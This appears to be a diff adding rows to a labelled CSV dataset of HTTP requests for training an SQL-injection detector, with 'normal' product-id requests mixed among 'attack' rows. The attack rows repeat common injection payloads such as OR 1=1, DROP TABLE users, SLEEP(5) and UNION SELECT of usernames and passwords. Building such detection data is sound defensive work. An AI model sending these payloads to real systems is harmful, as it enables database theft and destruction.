+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=24 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=43 HTTP/1.1,normal,SQLi
+GET /product?id=69 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=17 HTTP/1.1,normal,SQLi
+GET /product?id=47 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=53 HTTP/1.1,normal,SQLi
+GET /product?id=91 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=5 HTTP/1.1,normal,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=65 HTTP/1.1,normal,SQLi
+GET /product?id=7 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=68 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=34 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=40 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=87 HTTP/1.1,normal,SQLi
+GET /product?id=67 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=10 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=19 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=71 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=46 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=51 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=10 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=20 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=47 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=10 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=96 HTTP/1.1,normal,SQLi
+GET /product?id=55 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=24 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=11 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=59 HTTP/1.1,normal,SQLi
+GET /product?id=15 HTTP/1.1,normal,SQLi
+GET /product?id=19 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=7 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=52 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=80 HTTP/1.1,normal,SQLi
